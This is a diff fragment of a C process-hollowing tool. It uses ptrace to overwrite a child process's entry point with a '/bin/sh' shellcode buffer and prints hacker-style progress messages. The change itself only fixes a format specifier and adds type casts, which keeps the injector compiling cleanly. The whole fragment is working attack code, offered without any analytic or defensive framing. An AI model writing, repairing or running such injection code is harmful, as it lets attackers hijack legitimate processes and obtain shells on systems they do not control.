@@ -43,12 +43,12 @@ int inject_hollowing(const char *target_binary) {
     }
 
     ptrace(PTRACE_GETREGS, child, NULL, &regs);
-    printf("[+] Child RIP (entry point): 0x%lx\n", regs.rip);
+    printf("[+] Child RIP (entry point): 0x%llx\n", regs.rip);
 
     for (int i = 0; i < slen; i += sizeof(long)) {
         unsigned long data = 0;
         memcpy(&data, shell_binsh + i, 
-               (slen - i < sizeof(long)) ? (slen - i) : sizeof(long));
+                (slen - i < (int)sizeof(long)) ? (slen - i) : (int)sizeof(long));
         ptrace(PTRACE_POKETEXT, child, regs.rip + i, data);
     }
     printf("[+] Shellcode written to entry point\n");
